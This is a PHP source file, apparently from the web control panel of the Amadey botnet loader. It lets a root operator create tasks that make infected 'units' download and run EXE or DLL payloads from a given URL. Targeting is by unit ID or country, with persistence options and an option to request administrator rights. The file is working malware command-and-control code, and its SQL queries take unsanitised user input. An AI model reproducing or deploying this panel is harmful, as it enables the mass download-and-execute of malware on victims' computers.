<?php

    session_start();

    error_reporting( 0 );

    if ( !( isset( $_SESSION['Name'] ) ) )
    {
       header( "Location: login.php" );
       exit;
    }

    function MakeTask( $Url, $run, $filetype, $autorun, $limit, $units, $country ) 
    { 
       include( "config.php" ); 
		
	mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ); 
	mysql_select_db( $conf["dbname"] ); 

	if ( $country == "*" ) 
          $country = ""; 

	if ( $units == "*" ) 
          $units = ""; 
		
	$sql = "SHOW TABLE STATUS LIKE 'tasks'";
	$res = mysql_query( $sql );
	$row = mysql_fetch_array( $res );
		
	if( $row['Auto_increment'] < 1000001) 	
	   mysql_query( "INSERT INTO tasks ( `id`, `path`, `run`, `filetype`, `autorun`, `tlimit`, `units`, `country` ) VALUES (  '1000001', '$Url', '$run', '$filetype', '$autorun', '$limit', '$units', '$country' )" ); 
	else 
	   mysql_query( "INSERT INTO tasks ( `path`, `run`, `filetype`, `autorun`, `tlimit`, `units`, `country` ) VALUES ( '$Url', '$run', '$filetype', '$autorun', '$limit', '$units', '$country' )" ); 
		
       mysql_close(); 
    } 

    function MakeFormAlt( $c, $u ) 
    {
       if ( $c == "" )   
          $count = "100";
       else
          $count = $c;

       if ( $u == "" )
          $unit = "*";
       else
          $unit = $u;

       $res =  "<div align=\"center\">
                <form action=\"" . basename( $_SERVER['SCRIPT_NAME'] ) . "\" method=\"post\" name=\"form\">
                   <table border=\"0\" width=\"1200\" cellspacing=\"0\" class=table cellpadding=\"0\">
	               <tr>
		           <td>  
                            <table border=\"0\" width=\"1200\" height=\"220\" class=table_lig cellspacing=\"0\" cellpadding=\"0\">
	                        <tr>
		                    <td width=\"150\">&nbsp;URL:</td>
		                    <td>
		                       <input name=\"path\" class=task value=\"http://site.com/folder/exe.e\" style=\"float: left\" size=\"50\">
                                  </td>
		             
                                  <td>
                                     * Web URL, file will be saved with original name, expansion will be changed.
                                  </td>
	                        </tr>
	      
                               <tr>
		                    <td>&nbsp;UID:</td>

		                    <td>
		                       <input name=\"unitid\" class=task value=\"" . $unit . "\" style=\"float: left\">
                                  </td>

		                    <td>
                                     * Uniqal unit identificator or * for all units.
                                  </td>
	                        </tr>

	                        <tr>
		                    <td>&nbsp;Limit:</td>
		 
                                  <td>
		                       <input name=\"count\" class=task value=\"" . $count . "\" style=\"float: left\">
                                  </td>

		                    <td>
                                     * This task loads count.
                                  </td>
	                        </tr>

	                        <tr>
		                    <td>&nbsp;Countries:</td>
		 
                                  <td>
		                       <input name=\"country\" class=task value=\"*\" style=\"float: left\">
                                  </td>

		                    <td>
                                     * Chosen country, * for any. <a href=\"images/task_example.png\" target=\"_blank\">Example</a>. <a href=\"f.st\c.index.txt\" target=\"_blank\">Countries <b>index</b> table</a>.
                                  </td>
	                        </tr>

                               <tr>
		                    <td>&nbsp;File type:</td>

		                    <td>
		                       <select name=\"filetype\">
                                        <option value=\"0\">EXE file</option>
                                        <option value=\"1\">DLL file</option>
                                     </select>
                                  </td>
		
                                  <td>
                                     * File PE type, any expansion.
                                  </td>
	                        </tr>

	                        <tr>
		                    <td>&nbsp;Dll function name:</td>
		 
                                  <td>
		                       <input name=\"dllfunction\" class=task value=\"Main\" style=\"float: left\">
                                  </td>

		                    <td>
                                     * Name of the calling function, <b>only for DLL</b>.
                                  </td>
	                        </tr>

                               <tr>
		                    <td>&nbsp;Exe autorun type:</td>

		                    <td>
		                       <select name=\"autorun\"> 
                                        <option value=\"1\">Self autorun</option>
                                        <option value=\"0\">Amadey autorun</option>
                                     </select>
                                  </td>
	
                                  <td>
                                     * Startup options, <b>only for EXE</b>.
                                  </td>
	                        </tr>

                               <tr>
		                    <td>&nbsp;Exe launch:</td>

		                    <td>
		                       <select name=\"run\"> 
                                        <option value=\"0\">Current rights (current user)</option>
                                        <option value=\"1\">Up rights (request ADMINISTRATOR rights)</option>
                                     </select>
                                  </td>
	
	                           <td>
                                     * Startup options, <b>only for EXE</b>. Warning! Do not change this option if you don't know what it is.
                                  </td>
	                        </tr>
                            </table> 

                            <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
	                        <tr>
		                 <td>
                               </td>
	                        </tr>
                            </table>

                            <table border=\"0\" width=\"1200\" cellspacing=\"0\" cellpadding=\"0\">
	                        <tr>
		                    <td>
                                     <p align=\"center\">
                                        <input type=\"submit\" name=\"submit\" value=\"Save task\" class=\"button\">
                                     </p>
                                  </td>
	                        </tr>
                            </table>

                            <table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
	                        <tr>
		                    <td>
                                  </td>
	                        </tr>
                            </table>
		           </td>
	               </tr>
                   </table>
                </form> 
                </div>";

       return $res;
    }

    include( "header.php" );

    if( isset( $_POST['submit'] ) ) 
    { 
       if ( $_POST['filetype'] == 0 )
       {
          MakeTask( $_POST['path'], $_POST['run'], $_POST['filetype'], $_POST['autorun'], $_POST['count'], $_POST['unitid'], $_POST['country'] ); 
       }
       else
       {
          MakeTask( $_POST['path']  . ":::" . $_POST['dllfunction'], "0", $_POST['filetype'], $_POST['autorun'], $_POST['count'], $_POST['unitid'], $_POST['country'] ); 
       }

       echo "<meta http-equiv=\"refresh\" content=\"1; url=show_task.php\">"; 
    }
    else
    {
       if ( $_SESSION['Name'] == "ROOT" )  
       {
          echo ( MakeFormAlt( $_GET["count"], $_GET["unit"] ) ); 
       }
       else
       {
          echo "Please login at root, observers cant make task"; 
       }
    }
   
    echo "</html>";
?> 